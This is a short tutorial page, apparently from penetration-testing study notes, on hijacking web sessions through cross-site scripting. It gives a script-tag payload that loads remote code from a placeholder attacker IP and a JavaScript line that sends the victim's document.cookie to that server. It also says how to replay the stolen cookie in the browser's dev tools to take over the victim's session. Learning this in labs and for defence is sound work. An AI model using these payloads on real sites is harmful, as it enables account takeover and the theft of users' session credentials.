# Session Hijacking

After we have identified a working remote XSS payload and the vulnerable input field, only then we can perform a session hijacking attack (See Blind XSS to discover working remote payloads).

{% code title="Working malicious remote payload" %}
```javascript
<script src=http://OUR_IP/script.js></script> # IP and PORT of the PHP server
```
{% endcode %}

Now execute the malicious payload above to call the malicious script below which will be hosted on our PHP server, which will send a cookie to our self-hosted netcat server when the victim visits the vulnerable page (Start PHP & netcat servers in advance).

{% code title="Hosting a malicious cookie grabbing script on our machine" %}
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```
{% endcode %}

We can add the grabbed cookie to Storage in Dev Tools, and reload a /login.php page to get access to that victim's session.

#### **Refining the Attack**

There might be many victim cookies that get routed to our server. We can write a PHP script to order them and more. We can save the script as index.php. Once a victim visits the vulnerable page we will get two requests now in our server.
